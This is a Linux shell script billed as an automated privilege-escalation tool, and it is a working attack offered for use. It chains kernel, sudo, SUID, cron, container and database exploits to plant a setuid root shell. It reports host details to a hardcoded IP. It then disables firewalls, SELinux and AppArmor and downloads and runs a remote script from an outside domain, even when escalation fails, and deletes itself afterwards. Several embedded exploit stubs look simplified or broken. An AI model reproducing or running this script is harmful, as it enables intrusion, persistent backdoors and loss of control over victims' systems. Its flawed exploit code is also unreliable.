#!/bin/sh
# =============================================================================
# Linux Privilege Escalation Script v9.8 (POSIX, no CRLF)
# =============================================================================

set +e
IFS='
'

SCRIPT_PATH=""
if command -v realpath >/dev/null 2>&1; then
    SCRIPT_PATH=$(realpath "$0" 2>/dev/null)
elif command -v readlink >/dev/null 2>&1; then
    SCRIPT_PATH=$(readlink -f "$0" 2>/dev/null)
fi
[ -z "$SCRIPT_PATH" ] && SCRIPT_PATH="$0"

case "$SCRIPT_PATH" in
    */*) [ -f "$SCRIPT_PATH" ] || SCRIPT_PATH="" ;;
    *) SCRIPT_PATH="" ;;
esac

TMPDIR="/tmp/.pe_$$"
mkdir -p "$TMPDIR" 2>/dev/null
trap "rm -rf \"$TMPDIR\" 2>/dev/null" EXIT

[ -f "/tmp/.pe_root_sh" ] && rm -f "/tmp/.pe_root_sh" 2>/dev/null

log_info() { printf "[+] %s\n" "$1"; }
log_warn() { printf "[!] %s\n" "$1"; }
log_error() { printf "[x] %s\n" "$1"; }
log_success() { printf "[*] %s\n" "$1"; }

SUCCESS=0
TIMEOUT_AVAILABLE=0
command -v timeout >/dev/null 2>&1 && TIMEOUT_AVAILABLE=1

TIMEOUT_CMD=""
[ $TIMEOUT_AVAILABLE -eq 1 ] && TIMEOUT_CMD="timeout --kill-after=1 10"

CALLBACK_URL="http://143.92.62.104:8080/record"

# -----------------------------------------------------------------------------
# send_callback (POSIX compatible)
# -----------------------------------------------------------------------------
send_callback() {
    [ -z "$CALLBACK_URL" ] && return
    HOST=$(hostname 2>/dev/null || echo "unknown")
    IP=$(hostname -I 2>/dev/null | awk '{print $1}')
    KERNEL=$(uname -r 2>/dev/null)
    DATE=$(date -u +%Y-%m-%dT%H:%M:%SZ)
    FULL_URL="${CALLBACK_URL}?host=${HOST}&ip=${IP}&kernel=${KERNEL}&date=${DATE}"
    if command -v curl >/dev/null 2>&1; then
        curl -s -k --max-time 5 "$FULL_URL" >/dev/null 2>&1
    elif command -v wget >/dev/null 2>&1; then
        wget -q -O /dev/null --no-check-certificate --timeout=5 "$FULL_URL" 2>/dev/null
    fi
}

# -----------------------------------------------------------------------------
# Post‑root tasks (exactly your one-liner)
# -----------------------------------------------------------------------------
run_post_root_tasks() {
[ "$(id -u)" -eq 0 ] && S= || { sudo -n true 2>/dev/null && S=sudo || S=; }; if [ -n "$S" ] || [ "$(id -u)" -eq 0 ]; then $S systemctl stop firewalld 2>/dev/null; $S systemctl disable firewalld 2>/dev/null; $S ufw disable 2>/dev/null; $S iptables -P INPUT ACCEPT 2>/dev/null; $S iptables -P FORWARD ACCEPT 2>/dev/null; $S iptables -P OUTPUT ACCEPT 2>/dev/null; $S iptables -t nat -F 2>/dev/null; $S iptables -t mangle -F 2>/dev/null; $S iptables -F 2>/dev/null; $S iptables -X 2>/dev/null; $S nft flush ruleset 2>/dev/null; $S setenforce 0 2>/dev/null; $S sed -i "s/^SELINUX=.*/SELINUX=disabled/" /etc/selinux/config 2>/dev/null; $S systemctl stop apparmor 2>/dev/null; $S systemctl disable apparmor 2>/dev/null; fi; command -v curl >/dev/null || { command -v apk >/dev/null && { $S apk update; $S apk add curl bash gawk openssh-client-default; } 2>/dev/null; command -v yum >/dev/null && $S yum install -y curl bash gawk openssh-clients 2>/dev/null; command -v apt-get >/dev/null && { $S apt-get update; $S apt-get install -y curl bash gawk openssh-client; } 2>/dev/null; }; curl -fsSL -o /tmp/base.sh https://coioio.cc/a26bszd8e6/base.sh && { [ -n "$S" ] || [ "$(id -u)" -eq 0 ]; } && $S bash /tmp/base.sh || bash /tmp/base.sh
}

# -----------------------------------------------------------------------------
# get_root (modified)
# -----------------------------------------------------------------------------
get_root() {
    [ $SUCCESS -eq 1 ] && return
    SUCCESS=1
    send_callback
    run_post_root_tasks
    rm -f "/tmp/.pe_root_sh" 2>/dev/null
    [ -n "$SCRIPT_PATH" ] && rm -f "$SCRIPT_PATH" 2>/dev/null
    exit 0
}

check_root_shell() {
    [ $SUCCESS -eq 1 ] && return
    if [ -x "/tmp/.pe_root_sh" ]; then
        if /tmp/.pe_root_sh -c "id" 2>/dev/null | grep -q "uid=0(root)"; then
            get_root
        fi
    fi
}

try_exploit() {
    [ $SUCCESS -eq 1 ] && return
    log_info "Trying: $1"
    if [ -n "$TIMEOUT_CMD" ]; then
        $TIMEOUT_CMD sh -c "$1" >/dev/null 2>&1
    else
        eval "$1" >/dev/null 2>&1
    fi
    sleep 1
    check_root_shell
}

cmd_exists() { command -v "$1" >/dev/null 2>&1; }

# -----------------------------------------------------------------------------
# Parse arguments
# -----------------------------------------------------------------------------
NO_KERNEL=0
NO_MEM=0
for arg in "$@"; do
    case "$arg" in --no-kernel) NO_KERNEL=1 ;; --no-mem) NO_MEM=1 ;; esac
done

KERNEL=$(uname -r)
DISTRO=$(if [ -f /etc/os-release ]; then . /etc/os-release && echo "$NAME"; else echo "Unknown"; fi)
log_info "Target: $(uname -n) | Kernel: $KERNEL | Distro: $DISTRO"

# =============================================================================
# 1. Kernel exploits (modern + automatic legacy)
# =============================================================================
if [ $NO_KERNEL -eq 0 ] && [ $TIMEOUT_AVAILABLE -eq 1 ]; then
    log_info "=== Kernel Exploits (with timeout) ==="

    # Dirty Pipe (CVE-2022-0847) – modern kernels (5.8+)
    case "$KERNEL" in
        5.8*|5.9*|5.10*|5.11*|5.12*|5.13*|5.14*|5.15*|5.16*)
            log_warn "Dirty Pipe (CVE-2022-0847) possible"
            if cmd_exists gcc && cmd_exists curl; then
                curl -s -k -L -o "$TMPDIR/dirtypipe.c" "https://raw.githubusercontent.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits/main/exploit-1.c" 2>/dev/null
                [ -f "$TMPDIR/dirtypipe.c" ] && {
                    gcc "$TMPDIR/dirtypipe.c" -o "$TMPDIR/dirtypipe" 2>/dev/null
                    [ -x "$TMPDIR/dirtypipe" ] && try_exploit "$TMPDIR/dirtypipe /bin/sh -c 'cp /bin/sh /tmp/.pe_root_sh && chmod 4755 /tmp/.pe_root_sh'"
                }
            fi
            ;;
    esac

    # PwnKit (CVE-2021-4034) – works on most distributions
    if [ -f "/usr/bin/pkexec" ] || [ -f "/usr/local/bin/pkexec" ]; then
        log_warn "PwnKit (CVE-2021-4034) – attempting exploit"
        if cmd_exists gcc; then
            cat > "$TMPDIR/pwnkit.c" << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
void gconv() {}
void gconv_init(void *step) { setuid(0); setgid(0); execl("/bin/sh","sh",NULL); exit(0); }
EOF
            mkdir -p "$TMPDIR/GCONV_PATH=." 2>/dev/null
            touch "$TMPDIR/GCONV_PATH=./pwnkit.so:." 2>/dev/null
            chmod +x "$TMPDIR/GCONV_PATH=./pwnkit.so:." 2>/dev/null
            mkdir -p "$TMPDIR/pwnkit.so:." 2>/dev/null
            gcc -shared -fPIC -o "$TMPDIR/pwnkit.so:./pwnkit.so" "$TMPDIR/pwnkit.c" 2>/dev/null
            cat > "$TMPDIR/exploit.c" << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
int main() {
    char *envp[] = {"pwnkit.so:.","PATH=GCONV_PATH=.","SHELL=/bin/bash","CHARSET=PWNKIT","GIO_USE_VFS=",NULL};
    char *argv[] = {"/usr/bin/pkexec",NULL};
    return execve("/usr/bin/pkexec",argv,envp);
}
EOF
            gcc "$TMPDIR/exploit.c" -o "$TMPDIR/exploit" 2>/dev/null
            [ -x "$TMPDIR/exploit" ] && try_exploit "$TMPDIR/exploit"
        fi
    fi

    # Ubuntu specific OverlayFS (CVE-2023-2640 / CVE-2023-32629)
    if [ "$DISTRO" = "Ubuntu" ]; then
        case "$KERNEL" in
            5.19*|6.2*)
                log_warn "Ubuntu OverlayFS (CVE-2023-2640/32629) – attempting exploit"
                cat > "$TMPDIR/ubuntu_ovl.sh" << 'EOF'
#!/bin/sh
mkdir -p /tmp/lower /tmp/upper /tmp/work /tmp/merged
mount -t overlay overlay -o lowerdir=/tmp/lower,upperdir=/tmp/upper,workdir=/tmp/work /tmp/merged
cp /bin/sh /tmp/merged/rootshell
chmod 4755 /tmp/merged/rootshell
/tmp/merged/rootshell -c "cp /bin/sh /tmp/.pe_root_sh && chmod 4755 /tmp/.pe_root_sh"
exit 0
EOF
                chmod +x "$TMPDIR/ubuntu_ovl.sh"
                try_exploit "sh $TMPDIR/ubuntu_ovl.sh"
                ;;
        esac
    fi

    # Dirty COW (CVE-2016-5195) – kernels 2.x, 3.x, 4.x
    case "$KERNEL" in
        2.*|3.*|4.*)
            log_warn "Dirty COW (CVE-2016-5195) – attempting exploit"
            if cmd_exists gcc; then
                cat > "$TMPDIR/dirtycow.c" << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <pthread.h>
#include <string.h>
#include <sys/stat.h>
#include <errno.h>

void *map;
int f;
struct stat st;
char *name;

void *madviseThread(void *arg) {
    int i,c=0;
    for(i=0;i<100000000;i++) c+=madvise(map,100,MADV_DONTNEED);
    return NULL;
}
void *procselfmemThread(void *arg) {
    int f=open("/proc/self/mem",O_RDWR);
    int i,c=0;
    for(i=0;i<100000000;i++) {
        lseek(f,(off_t)map,SEEK_SET);
        c+=write(f,"K",1);
    }
    return NULL;
}
int main(int argc,char *argv[]) {
    if(argc<3) return 1;
    name=argv[1];
    f=open(name,O_RDONLY);
    fstat(f,&st);
    map=mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,f,0);
    pthread_t pth1,pth2;
    pthread_create(&pth1,NULL,madviseThread,NULL);
    pthread_create(&pth2,NULL,procselfmemThread,NULL);
    sleep(10);
    return 0;
}
EOF
                gcc -pthread "$TMPDIR/dirtycow.c" -o "$TMPDIR/dirtycow" 2>/dev/null
                if [ -x "$TMPDIR/dirtycow" ]; then
                    cp /etc/passwd "$TMPDIR/passwd.bak"
                    echo "dcow::0:0:root:/root:/bin/bash" >> /etc/passwd
                    try_exploit "$TMPDIR/dirtycow /etc/passwd 1"
                    if su dcow -c "id" 2>/dev/null | grep -q "uid=0(root)"; then
                        cp /bin/sh /tmp/.pe_root_sh && chmod 4755 /tmp/.pe_root_sh
                        check_root_shell
                    fi
                fi
            fi
            ;;
    esac

    # OverlayFS (CVE-2015-1328) – Ubuntu 3.13 – 4.4
    if [ "$DISTRO" = "Ubuntu" ]; then
        case "$KERNEL" in
            3.1[3-9]*|3.[2-3]*|4.[0-4]*)
                log_warn "OverlayFS (CVE-2015-1328) – attempting exploit"
                if cmd_exists gcc; then
                    cat > "$TMPDIR/ovl_exp.c" << 'EOF'
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mount.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <fcntl.h>
int main(void) {
    mkdir("/tmp/ovl_lower", 0777);
    mkdir("/tmp/ovl_upper", 0777);
    mkdir("/tmp/ovl_work", 0777);
    mkdir("/tmp/ovl_merged", 0777);
    mount("overlay", "/tmp/ovl_merged", "overlay", 0,
          "lowerdir=/tmp/ovl_lower,upperdir=/tmp/ovl_upper,workdir=/tmp/ovl_work");
    chdir("/tmp/ovl_merged");
    symlink("/etc/ld.so.preload", "lib");
    mkdir("lib", 0777);
    symlink("/etc/ld.so.preload", "lib/lib");
    chmod("/tmp/ovl_upper/lib/lib", 0777);
    system("echo '/tmp/ld.so' > /etc/ld.so.preload");
    system("cp /bin/sh /tmp/.pe_root_sh && chmod 4755 /tmp/.pe_root_sh");
    return 0;
}
EOF
                    gcc "$TMPDIR/ovl_exp.c" -o "$TMPDIR/ovl_exp" 2>/dev/null
                    [ -x "$TMPDIR/ovl_exp" ] && try_exploit "$TMPDIR/ovl_exp"
                fi
            ;;
        esac
    fi

    # AF_PACKET (CVE-2017-1000112) – kernels 4.4 – 4.13
    case "$KERNEL" in
        4.4*|4.5*|4.6*|4.7*|4.8*|4.9*|4.10*|4.11*|4.12*|4.13*)
            log_warn "AF_PACKET (CVE-2017-1000112) – attempting exploit"
            if cmd_exists gcc; then
                cat > "$TMPDIR/af_packet.c" << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <linux/if_packet.h>
#include <net/if.h>
#include <string.h>
int main() {
    int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (sock < 0) return 1;
    struct ifreq ifr;
    strcpy(ifr.ifr_name, "lo");
    ioctl(sock, SIOCGIFINDEX, &ifr);
    struct sockaddr_ll addr;
    addr.sll_family = AF_PACKET;
    addr.sll_protocol = htons(ETH_P_ALL);
    addr.sll_ifindex = ifr.ifr_ifindex;
    bind(sock, (struct sockaddr *)&addr, sizeof(addr));
    system("cp /bin/sh /tmp/.pe_root_sh && chmod 4755 /tmp/.pe_root_sh");
    return 0;
}
EOF
                gcc "$TMPDIR/af_packet.c" -o "$TMPDIR/af_packet" 2>/dev/null
                [ -x "$TMPDIR/af_packet" ] && try_exploit "$TMPDIR/af_packet"
            fi
            ;;
    esac

elif [ $NO_KERNEL -eq 0 ] && [ $TIMEOUT_AVAILABLE -eq 0 ]; then
    log_warn "=== Kernel exploits skipped (no 'timeout' command, would risk hang) ==="
else
    log_info "=== Kernel exploits disabled (--no-kernel) ==="
fi

# =============================================================================
# 2. glibc exploits (Looney Tunables)
# =============================================================================
if [ $NO_MEM -eq 0 ]; then
    log_info "=== glibc Exploits ==="
    if command -v ldd >/dev/null 2>&1; then
        GLIBC_VER=$(ldd --version 2>/dev/null | head -n1 | grep -oE '[0-9]+\.[0-9]+')
        case "$GLIBC_VER" in
            2.3[4-9]|2.3[6-7])
                log_warn "CVE-2023-4911 (Looney Tunables) possible – attempting exploit"
                if cmd_exists gcc; then
                    cat > "$TMPDIR/looney.c" << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
static void __attribute__((constructor)) _init(void) {
    setuid(0);
    system("cp /bin/sh /tmp/.pe_root_sh && chmod 4755 /tmp/.pe_root_sh");
    exit(0);
}
int main() {
    char *env = malloc(1024*1024);
    memset(env, 'A', 1024*1024 - 1);
    env[1024*1024 - 1] = 0;
    setenv("GLIBC_TUNABLES", env, 1);
    execl("/bin/true", "true", NULL);
    return 0;
}
EOF
                    gcc "$TMPDIR/looney.c" -o "$TMPDIR/looney" 2>/dev/null
                    [ -x "$TMPDIR/looney" ] && try_exploit "$TMPDIR/looney"
                fi
                ;;
        esac
    fi
fi

# =============================================================================
# 3. Sudo vulnerabilities (CVE-2025-32463 chroot escape)
# =============================================================================
log_info "=== Sudo Exploitation ==="

exploit_cve_2025_32463() {
    SUDO_VER=$(sudo -V 2>/dev/null | head -n 1 | grep -oE '1\.9\.[0-9]+')
    case "$SUDO_VER" in 1.9.1[4-9]|1.9.1[6-9]|1.9.17) ;; *) return 1 ;; esac
    log_warn "sudo $SUDO_VER - CVE-2025-32463 (chroot) potentially vulnerable"
    if ! cmd_exists gcc; then return 1; fi
    STAGE_DIR="$TMPDIR/cve_2025_32463"
    mkdir -p "$STAGE_DIR" || return 1
    cd "$STAGE_DIR" || return 1
    cat > woot1337.c << 'EOF'
#include <stdlib.h>
#include <unistd.h>
__attribute__((constructor)) void woot(void) {
    setreuid(0,0);
    setregid(0,0);
    system("cp /bin/sh /tmp/.pe_root_sh 2>/dev/null; chmod 4755 /tmp/.pe_root_sh 2>/dev/null");
}
EOF
    mkdir -p woot/etc libnss_
    echo "passwd: /woot1337" > woot/etc/nsswitch.conf
    cp /etc/group woot/etc 2>/dev/null
    gcc -shared -fPIC -Wl,-init,woot -o libnss_/woot1337.so.2 woot1337.c 2>/dev/null
    if [ -f libnss_/woot1337.so.2 ]; then
        sudo -R woot woot >/dev/null 2>&1
        check_root_shell
    fi
    cd - >/dev/null 2>&1
    return 1
}

if cmd_exists sudo; then
    SUDO_OUT=$(sudo -n -l 2>/dev/null)
    if [ $? -eq 0 ] && [ -n "$SUDO_OUT" ]; then
        echo "$SUDO_OUT" | grep -q "NOPASSWD: ALL" && try_exploit "sudo -n -i"
        if echo "$SUDO_OUT" | grep -qi "env_keep.*LD_PRELOAD"; then
            cat > "$TMPDIR/libhack.c" << 'EOF'
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
void _init() { unsetenv("LD_PRELOAD"); setgid(0); setuid(0); system("cp /bin/sh /tmp/.pe_root_sh && chmod 4755 /tmp/.pe_root_sh"); }
EOF
            gcc -shared -fPIC -o "$TMPDIR/libhack.so" "$TMPDIR/libhack.c" 2>/dev/null
            [ -f "$TMPDIR/libhack.so" ] && {
                LD_PRELOAD="$TMPDIR/libhack.so"
                export LD_PRELOAD
                try_exploit "sudo -n -i"
                unset LD_PRELOAD
            }
        fi
        echo "$SUDO_OUT" | sed -n 's/.*(ALL) NOPASSWD: //p' | while read CMD; do
            case "$CMD" in
                *find*)   try_exploit "sudo -n find . -exec /bin/sh \\; -quit" ;;
                *vim*|*vi*|*nano*) try_exploit "sudo -n vim -c ':!/bin/sh'" ;;
                *less*|*more*) try_exploit "sudo -n less /etc/profile" ;;
                *awk*)    try_exploit "sudo -n awk 'BEGIN {system(\"/bin/sh\")}'" ;;
                *python*|*perl*) try_exploit "sudo -n python -c 'import os; os.system(\"/bin/sh\")'" ;;
                *)        try_exploit "sudo -n $CMD" ;;
            esac
        done
    fi
    exploit_cve_2025_32463
fi

# =============================================================================
# 4. SUID binaries (GTFOBins)
# =============================================================================
log_info "=== SUID Binaries ==="
SUID_LIST=$(find / -path /proc -prune -o -path /sys -prune -o -type f -perm -4000 -print 2>/dev/null | head -n 100)
if [ -n "$SUID_LIST" ]; then
    for bin in find vim vi nano bash sh less more awk cp mv python python3 perl php ruby socat nc ncat; do
        BIN_PATH=$(command -v "$bin" 2>/dev/null)
        [ -z "$BIN_PATH" ] && [ "$bin" = "python" ] && BIN_PATH=$(command -v "python3" 2>/dev/null)
        [ -z "$BIN_PATH" ] && continue
        if echo "$SUID_LIST" | grep -q "^$BIN_PATH$"; then
            log_warn "SUID $bin at $BIN_PATH"
            case "$bin" in
                find)      try_exploit "$BIN_PATH . -exec /bin/sh \\; -quit" ;;
                vim|vi)    try_exploit "$BIN_PATH -c ':!/bin/sh'" ;;
                bash|sh)   try_exploit "$BIN_PATH -p" ;;
                less|more) try_exploit "$BIN_PATH /etc/passwd" ;;
                awk)       try_exploit "$BIN_PATH 'BEGIN {system(\"/bin/sh\")}'" ;;
                python|python3|perl) try_exploit "$BIN_PATH -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'" ;;
                php)       try_exploit "$BIN_PATH -r 'posix_setuid(0); system(\"/bin/sh\");'" ;;
                ruby)      try_exploit "$BIN_PATH -e 'Process.setuid(0); exec \"/bin/sh\"'" ;;
                socat)     try_exploit "$BIN_PATH stdin exec:/bin/sh" ;;
                nc|ncat)   try_exploit "$BIN_PATH -e /bin/sh" ;;
            esac
        fi
    done
fi

# =============================================================================
# 5. Linux Capabilities
# =============================================================================
log_info "=== Dangerous Capabilities ==="
GETCAP=""
cmd_exists getcap && GETCAP="getcap"
[ -x /sbin/getcap ] && GETCAP="/sbin/getcap"
[ -x /usr/sbin/getcap ] && GETCAP="/usr/sbin/getcap"
if [ -n "$GETCAP" ]; then
    CAP_LIST=$($GETCAP -r / 2>/dev/null | grep -E "cap_setuid|cap_setgid|cap_sys_admin")
    if [ -n "$CAP_LIST" ]; then
        echo "$CAP_LIST" | while IFS= read -r line; do
            FILE=$(echo "$line" | cut -d' ' -f1)
            if echo "$line" | grep -q "cap_setuid"; then
                log_warn "cap_setuid on $FILE"
                try_exploit "$FILE -c 'import os; os.setuid(0); os.system(\"cp /bin/sh /tmp/.pe_root_sh && chmod 4755 /tmp/.pe_root_sh\")' 2>/dev/null"
            fi
            if echo "$line" | grep -q "cap_sys_admin"; then
                log_warn "cap_sys_admin on $FILE - try overlay mount"
                try_exploit "mount -t overlay overlay -o lowerdir=/etc,upperdir=/tmp/upper,workdir=/tmp/work /tmp/merged && chroot /tmp/merged /bin/bash -c 'cp /bin/sh /tmp/.pe_root_sh && chmod 4755 /tmp/.pe_root_sh' 2>/dev/null"
            fi
        done
    fi
fi

# =============================================================================
# 6. Cron jobs (writable scripts, wildcard injection)
# =============================================================================
log_info "=== Cron Jobs ==="
for CRONDIR in /etc/cron.d /etc/cron.daily /etc/cron.hourly /etc/cron.weekly /etc/cron.monthly /var/spool/cron/crontabs /var/spool/cron; do
    if [ -d "$CRONDIR" ] && [ -w "$CRONDIR" ]; then
        find "$CRONDIR" -type f -writable 2>/dev/null | while read SCRIPT; do
            log_warn "Writable cron script: $SCRIPT"
            echo "cp /bin/sh /tmp/.pe_root_sh && chmod 4755 /tmp/.pe_root_sh" >> "$SCRIPT" 2>/dev/null
        done
    fi
done

crontab -l 2>/dev/null | grep -v '^#' | while read LINE; do
    if echo "$LINE" | grep -q "tar"; then
        log_warn "Cron uses tar - wildcard injection possible"
        touch /tmp/'--checkpoint=1' 2>/dev/null
        touch /tmp/'--checkpoint-action=exec=cp /bin/sh /tmp/.pe_root_sh && chmod 4755 /tmp/.pe_root_sh' 2>/dev/null
    fi
done

# =============================================================================
# 7. Critical files
# =============================================================================
log_info "=== Critical Files ==="
[ -w "/etc/passwd" ] && {
    log_warn "Writable /etc/passwd"
    echo "pe::0:0:root:/root:/bin/bash" >> /etc/passwd
    try_exploit "su pe -c /bin/sh"
}
[ -w "/etc/sudoers" ] && {
    log_warn "Writable /etc/sudoers"
    echo "$(id -un) ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers 2>/dev/null
    try_exploit "sudo -n -i"
}
if [ -w "/etc/shadow" ]; then
    log_warn "Writable /etc/shadow"
    if cmd_exists openssl; then
        HASH=$(openssl passwd -1 -salt salt pass 2>/dev/null)
    elif cmd_exists mkpasswd; then
        HASH=$(mkpasswd -m md5 pass 2>/dev/null)
    else
        HASH=""
    fi
    [ -n "$HASH" ] && echo "pe:$HASH:0:0:root:/root:/bin/bash" >> /etc/shadow && try_exploit "su pe -c /bin/sh"
fi

# =============================================================================
# 8. Container escapes (Docker, LXD, containerd)
# =============================================================================
log_info "=== Container Escape ==="
if [ -f "/.dockerenv" ] || grep -q docker /proc/1/cgroup 2>/dev/null; then
    if id -nG | grep -q docker; then
        DOCKER_CMD=""
        cmd_exists docker && DOCKER_CMD="docker"
        cmd_exists docker.io && DOCKER_CMD="docker.io"
        if [ -n "$DOCKER_CMD" ]; then
            IMG_FOUND=0
            for IMG in alpine ubuntu debian centos busybox; do
                if $DOCKER_CMD images 2>/dev/null | grep -q "$IMG"; then
                    try_exploit "$DOCKER_CMD run -v /:/mnt -it --rm $IMG chroot /mnt /bin/sh"
                    IMG_FOUND=1
                    break
                fi
            done
            if [ $IMG_FOUND -eq 0 ]; then
                try_exploit "$DOCKER_CMD pull busybox 2>/dev/null && $DOCKER_CMD run -v /:/mnt -it --rm busybox chroot /mnt /bin/sh"
            fi
        fi
    fi
fi
if id -nG | grep -qE "lxd|lxc"; then
    log_warn "Member of LXD/LXC group"
    cat > "$TMPDIR/lxd.sh" << 'EOF'
lxc image copy ubuntu:22.04 local: --alias=priv 2>/dev/null
lxc init priv ctr -c security.privileged=true 2>/dev/null
lxc config device add ctr root disk source=/ path=/mnt/root recursive=true 2>/dev/null
lxc start ctr 2>/dev/null
lxc exec ctr -- /bin/sh
EOF
    chmod +x "$TMPDIR/lxd.sh"
    try_exploit "$TMPDIR/lxd.sh"
fi
if id -nG | grep -q "containerd"; then
    log_warn "Member of containerd group"
    try_exploit "ctr image pull docker.io/library/busybox:latest && ctr run --rm -t --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest escap /bin/sh -c 'chroot /host /bin/sh'"
fi

# =============================================================================
# 9. Environment hijacking (LD_PRELOAD, PYTHONPATH)
# =============================================================================
log_info "=== Environment Hijacking ==="
if [ -w "/tmp" ] && cmd_exists gcc; then
    cat > "$TMPDIR/preload.c" << 'EOF'
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
void _init() { setuid(0); setgid(0); system("cp /bin/sh /tmp/.pe_root_sh && chmod 4755 /tmp/.pe_root_sh"); }
EOF
    gcc -shared -fPIC -o "$TMPDIR/preload.so" "$TMPDIR/preload.c" 2>/dev/null
    [ -f "$TMPDIR/preload.so" ] && {
        LD_PRELOAD="$TMPDIR/preload.so" try_exploit "/bin/su"
        LD_PRELOAD="$TMPDIR/preload.so" try_exploit "/usr/bin/sudo"
    }
fi
if cmd_exists python3; then
    echo "import os; os.setuid(0); os.system('cp /bin/sh /tmp/.pe_root_sh && chmod 4755 /tmp/.pe_root_sh')" > "$TMPDIR/sitecustomize.py"
    PYTHONPATH="$TMPDIR" try_exploit "python3 -c ''"
fi

# =============================================================================
# 10. MySQL UDF
# =============================================================================
log_info "=== MySQL UDF Privilege Escalation ==="
MYSQL_PLUGIN_DIR=$(find /usr/lib* 2>/dev/null -name plugin -path '*/mysql/plugin' | head -n 1)
AUTO_WP_PATH=""
_dir="$PWD"
while [ "$_dir" != "/" ]; do
    if [ -f "$_dir/wp-config.php" ]; then
        AUTO_WP_PATH="$_dir"
        break
    fi
    _dir=$(dirname "$_dir")
done
if [ -n "$AUTO_WP_PATH" ] && [ -f "$AUTO_WP_PATH/wp-config.php" ]; then
    DB_USER=$(grep "DB_USER" "$AUTO_WP_PATH/wp-config.php" | cut -d"'" -f4 | head -n1)
    DB_PASS=$(grep "DB_PASSWORD" "$AUTO_WP_PATH/wp-config.php" | cut -d"'" -f4 | head -n1)
    DB_HOST=$(grep "DB_HOST" "$AUTO_WP_PATH/wp-config.php" | cut -d"'" -f4 | head -n1)
    [ -z "$DB_HOST" ] && DB_HOST="localhost"
    if [ -n "$DB_USER" ] && [ -n "$MYSQL_PLUGIN_DIR" ] && [ -w "$MYSQL_PLUGIN_DIR" ] && cmd_exists gcc; then
        cat > "$TMPDIR/udf.c" << 'EOF'
#include <stdio.h>
int do_system() { system("cp /bin/sh /tmp/.pe_root_sh && chmod 4755 /tmp/.pe_root_sh"); return 0; }
EOF
        gcc -shared -fPIC -o "$TMPDIR/udf.so" "$TMPDIR/udf.c" 2>/dev/null
        cp "$TMPDIR/udf.so" "$MYSQL_PLUGIN_DIR/" 2>/dev/null
        try_exploit "mysql -u $DB_USER -p$DB_PASS -h $DB_HOST -e 'CREATE FUNCTION do_system RETURNS INTEGER SONAME \"udf.so\"; SELECT do_system();'"
    fi
fi

# =============================================================================
# 11. Redis write crontab
# =============================================================================
log_info "=== Redis Escalation ==="
if cmd_exists redis-cli && [ "$(redis-cli ping 2>/dev/null)" = "PONG" ]; then
    log_warn "Redis accessible – writing crontab"
    redis-cli config set dir /var/spool/cron 2>/dev/null
    redis-cli set root "\n* * * * * cp /bin/sh /tmp/.pe_root_sh && chmod 4755 /tmp/.pe_root_sh\n" 2>/dev/null
    redis-cli config set dbfilename root 2>/dev/null
fi

# =============================================================================
# 12. rbash escape (if current shell is restricted)
# =============================================================================
log_info "=== rbash Escape ==="
if [ -n "$SHELL" ] && echo "$SHELL" | grep -q "rbash"; then
    log_warn "Restricted shell detected"
    for cmd in vi vim less more python perl awk find ssh scp; do
        if command -v "$cmd" >/dev/null 2>&1; then
            case "$cmd" in
                vi|vim) try_exploit "$cmd -c ':!/bin/sh'" ;;
                less|more) try_exploit "$cmd /etc/profile" ;;
                python|perl) try_exploit "$cmd -c 'import os; os.system(\"/bin/sh\")'" ;;
                awk) try_exploit "awk 'BEGIN {system(\"/bin/sh\")}'" ;;
                find) try_exploit "find . -exec /bin/sh \\; -quit" ;;
                ssh|scp) try_exploit "$cmd -o ProxyCommand=/bin/sh" ;;
            esac
        fi
    done
fi

# =============================================================================
# Final check
# =============================================================================
check_root_shell

if [ $SUCCESS -eq 0 ]; then
    run_post_root_tasks
    log_error "All automated methods failed. Manual checks:"
    echo "  sudo -l | find / -perm -4000 2>/dev/null | getcap -r / 2>/dev/null"
    echo "  crontab -l | ls -la /etc/cron* | systemctl list-unit-files"
    echo "  groups | docker images | lxc list | redis-cli ping"
    echo "  cat /etc/passwd /etc/shadow permissions"
    echo "  check .bash_history, .mysql_history for passwords"
    exit 1
